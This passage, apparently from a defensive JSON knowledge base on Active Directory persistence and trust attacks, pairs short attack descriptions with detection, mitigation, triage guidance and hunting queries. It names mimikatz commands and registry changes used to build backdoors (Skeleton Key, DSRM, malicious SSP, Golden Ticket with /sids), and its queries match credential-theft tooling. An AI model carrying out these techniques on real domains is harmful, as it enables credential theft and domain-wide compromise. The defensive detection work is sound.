4768/4769(暗号化タイプ0x17=RC4への後退), Sysmon 10(LSASSアクセス)","mitigate":"Enable LSA Protection (RunAsPPL) to prevent LSASS patching. Deploy Credential Guard and application control (WDAC) on DCs. Minimize admin access to DCs and enforce AES to make RC4 regression easier to detect.","triage":"On the DC confirm Sysmon EID10 suspicious LSASS access (GrantedAccess 0x1fffff, etc.) or code injection plus 4673 (SeDebugPrivilege use), then correlate a fleet-wide downgrade to Encryption Type 0x17 (RC4) in subsequent 4768/4769. MDI Skeleton Key detection or on-DC mimikatz misc::skeleton traces confirm a true positive. LSASS access on a DC also occurs from legitimate EDR/AV, so a known signed vendor process without RC4 downgrade is benign.","hunt":[{"plat":"Sentinel","t":"Sudden domain-wide spike/majority of RC4 (0x17) auth = Skeleton Key downgrade / steady-state RC4 mix = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4768,4769)\n| summarize RC4=countif(TicketEncryptionType==\"0x17\"), Total=count() by bin(TimeGenerated,1h), Computer\n| extend RC4Ratio = round(todouble(RC4)/Total,2)\n| where Total > 20 and RC4Ratio > 0.5\n| order by RC4Ratio desc"},{"plat":"MDE","t":"Anomalous process access/API call to lsass.exe on a DC = LSASS patch / protected-process origin = benign","q":"DeviceEvents\n| where Timestamp > ago(1d)\n| where ActionType in (\"OpenProcessApiCall\",\"SensitiveApiCall\")\n| where FileName =~ \"lsass.exe\" or AdditionalFields has \"lsass\"\n| where InitiatingProcessFileName !in~ (\"MsMpEng.exe\",\"wininit.exe\",\"services.exe\",\"csrss.exe\")\n| project Timestamp, DeviceName, ActionType, InitiatingProcessFileName, InitiatingProcessCommandLine, AccountName\n| order by Timestamp desc"}],"huntcs":[{"plat":"Event Search","t":"misc::skeleton run / LSASS-patch trace on a DC = Skeleton Key (black) / normal LSASS activity = white","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*misc::skeleton*\" OR CommandLine=\"*skeleton*\" OR CommandLine=\"*mimikatz*\")\n| stats count by ComputerName, UserName, FileName, CommandLine"},{"plat":"Identity Protection","t":"Fleet-wide fallback to RC4 (0x17) auth is DC-only — caught by Identity Protection Skeleton Key detection","q":"// Falcon Identity Protection detection: Skeleton Key (encryption-type downgrade to RC4 across the domain, LSASS backdoor). DC上のLSASSインジェクション相関に依存。"}]},{"name":"Golden gMSA","aka":"Golden GMSA / KDS Root Key abuse","phase":"dominance","group":"Dominance & Persistence","mitre":"T1558","cve":"","sev":"High","summary":"Steal the KDS root key to compute gMSA (group Managed Service Account) passwords offline and persistently.","how":"Requires read access to the KDS root key (msKds-ProvRootKey, by default readable only by Domain Controllers/SYSTEM), typically obtained via DCSync or DA rights. From the root key and a gMSA's SID/attributes (msDS-ManagedPasswordId, etc.) the managedPassword can be computed offline; even if the gMSA password auto-rotates, future passwords can be predicted as long as the key is held, making it powerful persistence.","tools":"GoldenGMSA.exe, gMSADumper, Semperis GoldenGMSA","detect":"Monitor access (4662) to KDS root key objects (CN=Master Root Keys) and anomalous reads of a gMSA's msDS-ManagedPassword/ManagedPasswordId attributes. Correlate with DCSync or DA-privilege use, and detect KDS key access from ordinary endpoints.","events":"4662 (KDS Root Key/gMSA属性アクセス)","mitigate":"Strictly restrict read access to the KDS root key and enable access auditing. If a gMSA is compromised, consider recreating the KDS root key and the gMSA. Prevent key theft with Tier 0 protection and DCSync blocking.","triage":"On the DC confirm 4662 read access to the KDS Root Key object (CN=Master Root Keys, msKds-ProvRootKey) and gMSA msDS-ManagedPassword/msDS-ManagedPasswordId attributes, then correlate the source account/host with DCSync or DA privilege use. KDS-key reads from an ordinary workstation or non-DC process plus GoldenGMSA-style attribute enumeration confirm a true positive. Attribute access by the DC/SYSTEM itself or the Key Distribution Service during normal gMSA operation is benign.","hunt":[{"plat":"Sentinel","t":"4662 read of KDS Root Key / gMSA ManagedPassword attribute from non-standard host = Golden gMSA / DA backup ops = verify","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4662\n| where ObjectName has \"Master Root Keys\" or Properties has_any (\"ManagedPasswordId\",\"msDS-ManagedPassword\",\"msKds-RootKeyData\",\"msKds-ProvRootKey\")  // confirm attribute GUIDs in your tenant\n| where SubjectUserName !endswith \"$\"\n| project TimeGenerated, Computer, SubjectUserName, ObjectName, Properties, AccessMask, IpAddress\n| order by TimeGenerated desc"}],"huntcs":[{"plat":"Event Search","t":"GoldenGMSA/DSInternals reading KDS Root Key & ManagedPassword attrs = Golden gMSA (black) / absent = white","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*GoldenGMSA*\" OR CommandLine=\"*msDS-ManagedPassword*\" OR CommandLine=\"*ManagedPasswordId*\" OR CommandLine=\"*Get-KdsRootKey*\" OR CommandLine=\"*KdsRootKey*\")\n| stats count by ComputerName, UserName, FileName, CommandLine"},{"plat":"Identity Protection","t":"Read of the KDS root-key object (4662) is DC-only — KDS access from a normal endpoint detected via Identity Protection","q":"// Falcon Identity Protection detection: Golden gMSA / abnormal read of CN=Master Root Keys & gMSA ManagedPassword attributes (correlate with DCSync/DA use)."}]},{"name":"DSRM Password Abuse","aka":"Directory Services Restore Mode password abuse / DSRM Backdoor","phase":"dominance","group":"Dominance & Persistence","mitre":"T1556, T1078.003","cve":"","sev":"High","summary":"Configure the DC-local DSRM (restore mode) administrator account to allow network logon, turning it into a backdoor.","how":"Requires admin access to the DC. The DSRM account is the DC-local Administrator; obtain its hash (reg/lsadump) or set it to a known value with ntdsutil. Setting the registry DsrmAdminLogonBehavior to 2 allows network logon with the DSRM account, creating a stealthy backdoor accessible to the DC via Pass-the-Hash. Since it's not a domain account, it tends to fall outside password policy and rotation.","tools":"mimikatz (token/lsadump::sam), reg add (DsrmAdminLogonBehavior), ntdsutil","detect":"Monitor changes to the HKLM\\System\\CurrentControlSet\\Control\\Lsa\\DsrmAdminLogonBehavior registry value, and logons (4624 Logon Type 3) by the DC-local Administrator account (SID ending in 500, local). Detect SAM access on DCs and traces of DSRM hash retrieval.","events":"4657 (レジストリ変更), 4794 (DSRMパスワードリセット試行), 4624 (DSRMログオン)","mitigate":"Periodically audit that DsrmAdminLogonBehavior is not set to 2 and reset it to 0. Change the DSRM password regularly and manage it with documentation (`ntdsutil set dsrm password`). Minimize physical/admin access to DCs and monitor registry changes.","triage":"On the DC confirm 4657 changing HKLM\\System\\CurrentControlSet\\Control\\Lsa\\DsrmAdminLogonBehavior to 2, then correlate 4794 (DSRM password reset attempt) with 4624 LogonType3 by the local Administrator (SID ending in 500, local account). Network-based DSRM logon plus reg/lsadump traces confirm a true positive. A value of 2 with the DSRM account used only for console (LogonType2) maintenance leans benign, but any network logon always warrants investigation.","hunt":[{"plat":"MDE","t":"DsrmAdminLogonBehavior set to 1/2 = DSRM network logon enabled (backdoor) / default 0 = benign","q":"DeviceRegistryEvents\n| where Timestamp > ago(1d)\n| where RegistryKey has @\"Control\\Lsa\" and RegistryValueName =~ \"DsrmAdminLogonBehavior\"\n| where RegistryValueData != \"0\"\n| project Timestamp, DeviceName, RegistryValueName, RegistryValueData, PreviousRegistryValueData, InitiatingProcessFileName, InitiatingProcessCommandLine\n| order by Timestamp desc"},{"plat":"Sentinel","t":"Local Administrator (SID ...-500) network logon (4624/Type3) on a DC = DSRM abuse / console maintenance = verify","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4624 and LogonType == 3\n| where TargetSid endswith \"-500\"\n| project TimeGenerated, Computer, TargetUserName, TargetSid, IpAddress, WorkstationName, LogonType\n| order by TimeGenerated desc"}],"huntcs":[{"plat":"Event Search","t":"Change to DsrmAdminLogonBehavior registry value = DSRM backdoor enablement (black) / default unset = white","q":"event_simpleName=RegGenericValueUpdate RegValueName=\"DsrmAdminLogonBehavior\"\n| stats count by ComputerName, RegObjectName, RegValueName, RegStringValue"},{"plat":"LogScale","t":"Local Administrator Type3 logon on a DC = DSRM account abuse (black) / normal domain-DA use = white","q":"#event_simpleName=UserLogon\n| LogonType=3\n| UserName=/^administrator$/i\n| groupBy([ComputerName, UserName, LogonDomain, RemoteAddressIP4], function=count())"}]},{"name":"Custom/Malicious SSP","aka":"Malicious Security Support Provider / memssp","phase":"dominance","group":"Dominance & Persistence","mitre":"T1547.005","cve":"","sev":"High","summary":"Persistence that registers a malicious SSP/AP DLL in LSA to continuously steal and log plaintext credentials.","how":"Requires admin rights on the DC/host. Either inject an in-memory SSP into LSASS with `mimikatz misc::memssp`, or drop a DLL (mimilib.dll) and add the SSP to the registry HKLM\\System\\CurrentControlSet\\Control\\Lsa\\Security Packages so it stays active after reboot. Thereafter every authentication logs plaintext passwords to `%SystemRoot%\\System32\\kiwissp.log` etc., enabling continuous credential collection.","tools":"mimikatz (misc::memssp, mimilib.dll)","detect":"Monitor suspicious additions to Security Packages and OSConfig/LSA-related registry (4657), DLL loads into LSASS (Sysmon EID 7), and creation of suspicious files like kiwissp.log. Periodically reconcile against known SSP registrations.","events":"4657 (Security Packagesレジストリ変更), Sysmon 7 (DLLロード)","mitigate":"Use LSA Protection (RunAsPPL) to prevent loading unsigned SSPs. Baseline-monitor the Security Packages registry with change alerts. Use WDAC/AppLocker to restrict unauthorized DLL loads into LSA.","triage":"On the DC/host confirm 4657 additions (e.g. mimilib) to HKLM\\System\\CurrentControlSet\\Control\\Lsa\\Security Packages, then correlate Sysmon EID7 unsigned/unknown DLL loads into LSASS and Sysmon 11 creation of suspicious files like kiwissp.log. Registration of anything beyond known SSPs (kerberos/msv1_0/schannel/wdigest) plus mimikatz misc::memssp traces confirms a true positive. A signed SSP added legitimately under change control by a vendor MFA/SSO product is benign.","hunt":[{"plat":"MDE","t":"LSA Security Packages value changed (mimilib etc. added) = malicious SSP registration / no change = benign","q":"DeviceRegistryEvents\n| where Timestamp > ago(1d)\n| where RegistryKey has @\"Control\\Lsa\" and RegistryValueName in~ (\"Security Packages\",\"Authentication Packages\")\n| where RegistryValueData != PreviousRegistryValueData\n| project Timestamp, DeviceName, RegistryValueName, RegistryValueData, PreviousRegistryValueData, InitiatingProcessFileName, InitiatingProcessCommandLine\n| order by Timestamp desc"},{"plat":"MDE","t":"Creation of kiwissp.log/mimilib.dll = memssp artifact / absent = benign","q":"DeviceFileEvents\n| where Timestamp > ago(1d)\n| where FileName in~ (\"kiwissp.log\",\"mimilib.dll\")\n| project Timestamp, DeviceName, FileName, FolderPath, ActionType, InitiatingProcessFileName, InitiatingProcessAccountName\n| order by Timestamp desc"}],"huntcs":[{"plat":"Event Search","t":"Suspicious addition to LSA Security Packages = malicious SSP (memssp) registration (black) / default kerberos/msv1_0 = white","q":"event_simpleName=AsepValueUpdate RegValueName=\"*Security Packages*\" RegObjectName=\"*Lsa*\"\n| stats count by ComputerName, RegObjectName, RegValueName, RegStringValue"},{"plat":"LogScale","t":"Non-standard DLL (mimilib/kiwissp etc.) appearing in Security Packages value = black / standard SSPs only = white","q":"#event_simpleName=AsepValueUpdate\n| RegValueName=/Security Packages/i\n| RegStringValue=/mimilib|kiwissp|memssp|[^\\\\]+\\.dll/i\n| RegStringValue!=/kerberos|msv1_0|schannel|wdigest|tspkg|pku2u|cloudap|negoexts/i\n| groupBy([ComputerName, RegObjectName, RegStringValue], function=count())"}]},{"name":"AdminSDHolder Persistence","aka":"SDProp abuse / AdminSDHolder ACL persistence","phase":"dominance","group":"Dominance & Persistence","mitre":"T1098, T1078.002","cve":"","sev":"High","summary":"Tamper with the AdminSDHolder object's ACL so backdoor rights are auto-reapplied to protected groups every 60 minutes.","how":"Requires Domain Admin-equivalent rights. Adding attacker-account FullControl etc. to the DACL of CN=AdminSDHolder,CN=System,<domain> causes the SDProp process (default every 60 min) to auto-copy it to the ACLs of protected groups (Domain Admins, Enterprise Admins, etc.) and their members. Even if admins fix group membership, the ACL-level backdoor keeps getting reapplied, making it a stealthy persistence mechanism.","tools":"PowerView (Add-DomainObjectAcl), ntdsutil, dsacls, BloodHound","detect":"Monitor DACL changes on the AdminSDHolder object (5136), unexpected ACEs on adminCount=1 objects, and non-privileged accounts holding GenericAll/WriteDacl etc. Periodically scan for protected-group ACL anomalies after SDProp runs.","events":"5136 (DS Object変更), 4662 (AdminSDHolderアクセス)","mitigate":"Baseline the AdminSDHolder DACL and alert on changes immediately. Periodically audit ACLs of protected groups and adminCount=1 objects and remove backdoor ACEs. Strictly manage Tier0 privileges.","triage":"On the DC security log pull 5136 (DS Object modification) for CN=AdminSDHolder,CN=System and inspect the added ACE's grantee Security ID and Access rights (GenericAll/WriteDacl/WriteOwner). Identify the Subject and source host of 4662 access to the AdminSDHolder object, correlate Sysmon EID1 for PowerView(Add-DomainObjectAcl)/dsacls/ntdsutil, and if the same ACE propagates to protected-group (Domain Admins etc.) member ACLs right after SDProp (default 60 min) it is malicious. Non-privileged grantee, an unusual acting host/account, off-hours or one-shot change leans black. If a Tier0 admin acted from a PAW, the ACE matches a documented delegation or a known IDM/monitoring service account, and it maps to a change ticket, it is benign.","hunt":[{"plat":"Sentinel","t":"DACL changes on the AdminSDHolder object; non-Tier0 rewrites are black, planned schema-admin edits are white.","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where ObjectName has \"AdminSDHolder\"\n| where Properties has_any (\"nTSecurityDescriptor\",\"WriteDacl\",\"GenericAll\",\"WriteOwner\")\n| project TimeGenerated, Computer, SubjectUserName, SubjectDomainName, ObjectName, OperationType, Properties\n| sort by TimeGenerated desc"},{"plat":"Sentinel","t":"WriteDACL/WriteOwner access to AdminSDHolder (4662); a non-privileged principal grabbing the template is black, DC internal SDProp is white.","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4662\n| where ObjectName has \"AdminSDHolder\" or Properties has \"AdminSDHolder\"\n| where AccessMask in (\"0x40000\",\"0x20000\",\"0x10000\")  // WriteDACL / WriteOwner / Delete\n| where SubjectUserName !endswith \"$\"\n| summarize count() by Computer, SubjectUserName, SubjectDomainName, AccessMask, ObjectName"}],"huntcs":[{"plat":"Event Search","t":"dsacls/PowerView granting GenericAll/WriteDacl on AdminSDHolder = malicious / legit AD admin GUI or SDProp = benign","q":"event_simpleName=ProcessRollup2 CommandLine=\"*AdminSDHolder*\" (CommandLine=\"*GenericAll*\" OR CommandLine=\"*WriteDacl*\" OR CommandLine=\"*dsacls*\" OR CommandLine=\"*Add-DomainObjectAcl*\" OR CommandLine=\"*Set-Acl*\")\n| stats count by ComputerName, UserName, ParentBaseFileName, FileName, CommandLine\n| sort - count"},{"plat":"Identity Protection","t":"AdminSDHolder DACL change (5136) has little endpoint footprint — cover via Identity Protection detection","q":"// Falcon Identity Protection detection: privileged AD object ACL / AdminSDHolder DACL modification (DS-Access 4662/5136 is DC-only, not in Falcon EDR telemetry)"}]},{"name":"GPO Persistence/Abuse","aka":"Group Policy abuse / SharpGPOAbuse","phase":"dominance","group":"Dominance & Persistence","mitre":"T1484.001","cve":"","sev":"High","summary":"Tamper with a linked GPO to plant persistent, wide-reaching code execution via logon scripts / scheduled tasks / rights assignment.","how":"Requires write access to the target GPO (or its GPO folder in SYSVOL), obtained with an account holding GenericWrite/WriteDacl. Planting an immediate scheduled task, logon/startup script, local admin group addition (Restricted Groups), or user rights assignment (SeDebug etc.) in the GPO deploys persistent execution to all machines and users in the linked OU. This can broadly impact DCs/OUs and reach Domain Admin-level damage.","tools":"SharpGPOAbuse, PowerView (New-GPOImmediateTask), pyGPOAbuse, BloodHound","detect":"Monitor changes to GPO files in SYSVOL (GptTmpl.inf, ScheduledTasks.xml, Scripts.ini), updates to gPCMachineExtensionNames or versionNumber attributes (5136), and GPO ACL modifications. Correlate deployment traces of new scheduled tasks/scripts (4698, 5145 SYSVOL access).","events":"5136/5137 (GPOオブジェクト変更), 4698 (スケジュールタスク作成), 5145 (SYSVOLファイルアクセス)","mitigate":"Minimize GPO delegation (edit rights) and audit ACLs periodically. Monitor SYSVOL GPO file integrity and alert on version changes. Restrict GPO link changes on critical OUs and manage Tier0 GPOs separately.","triage":"On the DC pull 5136/5137 for the target GPO showing gPCMachineExtensionNames/versionNumber updates and GPO DACL changes (WriteDacl/GenericWrite), and identify the modifying Subject. Correlate DC 5145 SYSVOL writes (RelativeTargetName = GptTmpl.inf/ScheduledTasks.xml/Scripts.ini) with 4698 (scheduled task creation) on linked endpoints; Sysmon EID1 showing SharpGPOAbuse/pyGPOAbuse/New-GPOImmediateTask on the source makes it black. A local-admin add (Restricted Groups) or immediate task planted quickly by a non-GPO-admin leans black. If a GPO admin or SCCM/asset tool edited under change control with only a versionNumber bump and no rogue task/script artifacts, it is benign.","hunt":[{"plat":"Sentinel","t":"groupPolicyContainer edits (gPCMachineExtensionNames/versionNumber); injected CSE extensions are black, legit GPMC edits are white.","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (5136,5137)\n| where ObjectType has \"groupPolicyContainer\" or Properties has_any (\"gPCMachineExtensionNames\",\"versionNumber\",\"gPCUserExtensionNames\")\n| project TimeGenerated, Computer, SubjectUserName, SubjectDomainName, ObjectName, OperationType, Properties\n| sort by TimeGenerated desc"},{"plat":"Sentinel","t":"Writes to GPO payload files on SYSVOL (5145); attacker persistence deployment is black, admin rollout is white.","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5145\n| where ShareName has \"SYSVOL\"\n| where RelativeTargetName has_any (\"GptTmpl.inf\",\"ScheduledTasks.xml\",\"Scripts.ini\",\"Registry.pol\",\"psscripts.ini\")\n| where AccessMask has_any (\"0x2\",\"0x4\",\"0x100\")  // WriteData / AppendData\n| summarize count() by Computer, SubjectUserName, IpAddress, RelativeTargetName"},{"plat":"MDE","t":"GPO files created/modified under SYSVOL\\Policies on the DC; edits by an odd process are black, gpsvc updates are white.","q":"DeviceFileEvents\n| where Timestamp > ago(1d)\n| where FolderPath has \"SYSVOL\" and FolderPath has \"Policies\"\n| where FileName in~ (\"ScheduledTasks.xml\",\"GptTmpl.inf\",\"Scripts.ini\",\"Registry.pol\",\"psscripts.ini\")\n| where ActionType in (\"FileCreated\",\"FileModified\")\n| project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine"}],"huntcs":[{"plat":"Event Search","t":"SharpGPOAbuse/New-GPOImmediateTask injecting tasks/scripts into a GPO = malicious / legit GPMC edits = benign","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*SharpGPOAbuse*\" OR CommandLine=\"*New-GPOImmediateTask*\" OR CommandLine=\"*ScheduledTasks.xml*\" OR CommandLine=\"*gPCMachineExtensionNames*\" OR CommandLine=\"*GptTmpl.inf*\" OR CommandLine=\"*\\\\SYSVOL\\\\*Scripts.ini*\")\n| stats count by ComputerName, UserName, ParentBaseFileName, FileName, CommandLine\n| sort - count"}]},{"name":"Golden Certificate","aka":"Certificate-based persistence / CA private key theft (ESC-equivalent)","phase":"dominance","group":"Dominance & Persistence","mitre":"T1649","cve":"","sev":"Critical","summary":"Steal the AD CS CA private key and forge validly signed certificates for arbitrary users, achieving long-term persistence via PKINIT authentication.","how":"Requires admin access to the CA server. Steal the CA root/issuing certificate's private key (exported as .pfx if no HSM, via DPAPI/CryptoAPI) and offline-issue a validly signed certificate (a Golden Certificate) with an arbitrary SAN/UPN. It is not invalidated by password changes or krbtgt rotation, and can obtain TGTs via PKINIT throughout the certificate's validity (years), making it extremely powerful persistence. Can be combined with ESC1-8 misconfiguration abuse.","tools":"certipy (ca/forge), ForgeCert, SharpDPAPI, mimikatz (crypto::export)","detect":"Monitor CA private key export / CryptoAPI access, suspicious processes on the CA, and PKINIT authentication with certificates absent from the issuance log. Detect discrepancies between events 4886/4887 (cert request/issuance) and actual logons (4768 with certificate), and use of certificates with unexpected UPN/SAN.","events":"4886/4887 (証明書要求/発行), 4768 (PKINIT), CAアクセス監査","mitigate":"Protect the CA private key with an HSM and make it non-exportable. Strictly protect the CA server as Tier0 and minimize admin access. On compromise, CA key reissuance (root renewal) is required. Concurrently audit certificate template permissions (ESC mitigation).","triage":"On the CA server use Sysmon EID1/EID10 to spot certipy/ForgeCert/SharpDPAPI/mimikatz(crypto::export), access to lsass or the CA private-key store, and CryptoAPI key export. Reconcile the UPN/SAN of the certificate used in DC 4768 (PKINIT) against CA 4886/4887 (cert request/issuance) records; PKINIT with a certificate absent from the issuance log or an unexpected UPN/SAN (impersonating a privileged account) is black. Certificate auth still working after krbtgt rotation, or key access from a non-interactive suspicious CA process, leans black. If a PKI admin legitimately backed up/exported the key during a documented procedure with matching issuance records, it is benign.","hunt":[{"plat":"MDE","t":"CA private-key export/backup (certutil -backupkey/-exportPFX); key theft for a Golden Certificate is black, planned CA migration backup is white.","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where FileName in~ (\"certutil.exe\",\"powershell.exe\",\"certreq.exe\")\n| where ProcessCommandLine has_any (\"backupkey\",\"-exportPFX\",\"exportPFX\",\"-p \",\"Export-PfxCertificate\")\n| where ProcessCommandLine has_any (\"CA\",\"Root\",\"-privatekey\",\"Cert:\\\\LocalMachine\",\"My\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName\n| sort by Timestamp desc"},{"plat":"MDE","t":"MachineKeys/.pfx creation or CA cert-store access on the CA host; key exfiltration traces are black, normal cert renewal is white.","q":"DeviceFileEvents\n| where Timestamp > ago(1d)\n| where (FileName endswith \".pfx\" or FileName endswith \".p12\") or FolderPath has \"Microsoft\\\\Crypto\\\\RSA\\\\MachineKeys\"\n| where ActionType in (\"FileCreated\",\"FileModified\")\n| where InitiatingProcessFileName !in~ (\"certsrv.exe\",\"lsass.exe\",\"svchost.exe\")\n| project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessAccountName, InitiatingProcessCommandLine"}],"huntcs":[{"plat":"Event Search","t":"certutil -exportPFX/backupkey, ForgeCert, Certipy extracting CA private key = malicious / scheduled CA backup = benign","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*-exportPFX*\" OR CommandLine=\"*backupkey*\" OR CommandLine=\"*ForgeCert*\" OR CommandLine=\"*Certipy*\" OR CommandLine=\"*-backupdb*\" OR CommandLine=\"*ca.pfx*\")\n| stats count by ComputerName, UserName, ParentBaseFileName, FileName, CommandLine\n| sort - count"}]},{"name":"Kerberos Key Persistence (AES/RC4 keys)","aka":"Long-term account key retention / krbtgt AES key persistence","phase":"dominance","group":"Dominance & Persistence","mitre":"T1558, T1550.003","cve":"","sev":"High","summary":"Retain the long-term AES/RC4 keys of krbtgt or privileged accounts to continue ticket forgery and Overpass-the-Hash even after password changes.","how":"Requires having saved the AES256/AES128/RC4 keys of krbtgt/service accounts obtained via DCSync or NTDS theft. AES keys are derived from the password and salt (usually domain name + username), so the same key stays valid as long as the password is unchanged and can be reused for Golden/Silver/Diamond Ticket forgery or Overpass-the-Hash (Pass-the-Key). Since krbtgt is normally never rotated, it becomes the foundation for long-term persistence.","tools":"mimikatz (sekurlsa::ekeys, kerberos::ptt), Rubeus (asktgt /aes256), impacket (-aesKey)","detect":"Monitor single encryption types in AS-REQ (4768 encryption type) accompanying Pass-the-Key/Overpass-the-Hash, and privileged ticket requests from unusual hosts. Detect anomalous use of krbtgt/service keys and RC4 downgrade. Blocking DCSync to prevent key leakage itself is the root fix.","events":"4768/4769 (暗号化タイプ), 4624","mitigate":"Rotate krbtgt in two stages periodically to invalidate AES keys. Enforce AES and disable RC4 domain-wide, and on key leakage also update the passwords of related accounts. Prevent long-term key theft with Tier0 protection and DCSync auditing.","triage":"On the DC pull 4768/4769 Ticket Encryption Type and look for the single-etype signature of Pass-the-Key/Overpass-the-Hash, RC4(0x17) downgrade, or a privileged AS-REQ from an unusual host. Correlate target 4624 (LogonType3) and 4672 with source Sysmon EID1 (Rubeus asktgt /aes256, mimikatz sekurlsa::ekeys/kerberos::ptt, impacket -aesKey) on the same account and timestamp; a preceding DCSync (4662 DS-Replication) or NTDS theft makes it black. krbtgt/service-key use from an unexpected host off-hours leans black. A legitimate service account authenticating from its own host, predominantly AES(0x12), within business hours is benign.","hunt":[{"plat":"Sentinel","t":"Privileged TGT requests (4768) downgraded to RC4 (0x17); Pass-the-Key / key persistence is black, legacy non-AES clients are white.","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4768\n| where TicketEncryptionType == \"0x17\"\n| where TargetUserName !endswith \"$\"\n| summarize RC4tgt=count(), hosts=make_set(IpAddress,10) by TargetUserName, Computer\n| where RC4tgt > 0\n| sort by RC4tgt desc"},{"plat":"Sentinel","t":"NewCredentials logons (4624 Type 9); overpass-the-hash / runas /netonly key injection is black, deliberate admin credential switching is white.","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4624 and LogonType == 9\n| summarize count() by Computer, TargetUserName, SubjectUserName, ProcessName, IpAddress\n| where count_ > 0\n| sort by count_ desc"}],"huntcs":[{"plat":"LogScale","t":"Rubeus asktgt /rc4|/aes or mimikatz sekurlsa::ekeys minting TGTs from long-term keys = malicious / normal Windows auth = benign","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(asktgt|sekurlsa::ekeys|ptt).*(\\/rc4|\\/aes256|\\/aes128|\\/des)/i\n| groupBy([ComputerName, UserName, FileName, CommandLine], function=count(as=hits))\n| sort(hits, order=desc)"},{"plat":"Identity Protection","t":"Single-etype / RC4-downgrade AS-REQ (4768) is DC-side only — detect Pass-the-Key/Overpass-the-Hash via Identity Protection","q":"// Falcon Identity Protection detection: Pass-the-Key / Overpass-the-Hash (anomalous Kerberos encryption downgrade); 4768 etype is DC-only"}]},{"name":"Intra-forest SID History Injection (ExtraSids / Golden Ticket escalation)","aka":"ExtraSids attack, Child-to-Parent escalation, Golden Ticket with SID History","phase":"trust","group":"Trust / Cross-Forest","mitre":"T1134.005, T1558.001","cve":"","sev":"Critical","summary":"Use a child domain's KRBTGT hash to forge a Golden Ticket with the parent domain's Enterprise Admins (RID 519) SID etc. embedded in SID History, seizing the entire forest.","how":"Prerequisite: the child domain DC's KRBTGT hash (DCSync/ntds.dit) already obtained. Get the root domain SID and append `-519` (Enterprise Admins) or `-516` (Domain Controllers). Since intra-forest parent-child trusts have SID filtering disabled by default, the added SIDs are trusted as-is.","tools":"mimikatz `kerberos::golden /sids:S-1-5-21-ROOT-519`, impacket `ticketer.py --extra-sid`, Rubeus `golden`","detect":"Monitor abnormal TGT lifetimes (default 10 years), TGS requests with nonexistent accounts/RIDs, and child-domain accounts traversing to parent-domain resources within a short window. Watch event 4769 for anomalies in Ticket Options/encryption type (RC4=0x17).","events":"4769, 4768, 4672, 4624(ログオンタイプ3)","mitigate":"Rotate the KRBTGT password twice, separate Tier0, recognize that child DC compromise equals full forest compromise, and design admin boundaries at the forest level. Consider SID filtering (usually not possible for parent-child).","triage":"On the DC inspect 4769 Ticket Options and Encryption Type (RC4=0x17), plus TGS requests bearing a non-existent account/RID or a token ending in -519 (Enterprise Admins)/-516, and correlate privileged TGS/4672 that lack a matching 4768 (no interactive logon). A child-domain account traversing to parent high-privilege resources quickly with chained target 4624 (LogonType3), and source Sysmon EID1 showing mimikatz(kerberos::golden /sids)/impacket ticketer/Rubeus golden, is black; a TGT lifetime far beyond the 10-hour default (years-long) is definitive. Legitimate parent-child admin work by real Enterprise Admins, backed by a preceding 4768, AES etype, and known hosts, is benign.","hunt":[{"plat":"Sentinel","t":"Accounts issuing TGS (4769) with no preceding TGT (4768); an injected Golden/ExtraSids ticket is black, a normal AS-REQ→TGS-REQ chain is white.","q":"let tgt = SecurityEvent | where TimeGenerated > ago(1d) | where EventID == 4768 | distinct TargetUserName;\nSecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4769\n| where TargetUserName !endswith \"$\" and TargetUserName != \"\"\n| where TargetUserName !in (tgt)\n| summarize tgs=count(), svc=dcount(ServiceName) by TargetUserName, IpAddress, Computer\n| where tgs > 0"},{"plat":"Sentinel","t":"One account requesting RC4 (0x17) TGS (4769) against many services; forged-TGT lateral sweep is black, single-service normal use is white.","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4769 and TicketEncryptionType == \"0x17\"\n| where ServiceName != \"krbtgt\" and ServiceName !endswith \"$\"\n| summarize distinctSvc=dcount(ServiceName), tickets=count() by TargetUserName, IpAddress\n| where distinctSvc > 8"}],"huntcs":[{"plat":"Event Search","t":"mimikatz/Rubeus golden ticket with /sids= injecting SID History = malicious / /sids= never appears in legit ticket use","q":"event_simpleName=ProcessRollup2 CommandLine=\"*/sids=*\" (CommandLine=\"*golden*\" OR CommandLine=\"*krbtgt*\" OR CommandLine=\"*kerberos::*\" OR CommandLine=\"*asktgt*\")\n| stats count by ComputerName, UserName, ParentBaseFileName, FileName, CommandLine\n| sort - count"},{"plat":"Event Search","t":"One host fanning out to many parent-domain DCs on 88/445/464 = escalation = malicious / steady single-DC auth = benign","q":"event_simpleName=NetworkConnectIP4 (RemotePort=88 OR RemotePort=445 OR RemotePort=464)\n| stats dc(RemoteAddressIP4) as dcDCs by aid, ComputerName, ContextBaseFileName\n| where dcDCs >= 3"}]},{"name":"Cross-forest SID History Injection / SID Filtering Bypass","aka":"Forest trust SID filtering bypass, TREAT_AS_EXTERNAL abuse, Dirk-jan Mollema research","phase":"trust","group":"Trust / Cross-Forest","mitre":"T1134.005","cve":"","sev":"Critical","summary":"Cross-forest trusts have SID filtering (quarantine) enabled by default, but misconfiguration, SIDs with RID>1000, or TREAT_AS_EXTERNAL/enableSIDHistory being enabled allow injecting another forest's SIDs for cross-boundary escalation.","how":"Prerequisite: one forest's DC already compromised. Check whether the trust config permits SID History (netdom trust /EnableSIDHistory:yes) or check the TDO flags. Add the target forest's group SID with RID>1000 (e.g., a delegated high-privilege group) to a forged ticket. The filter drops well-known 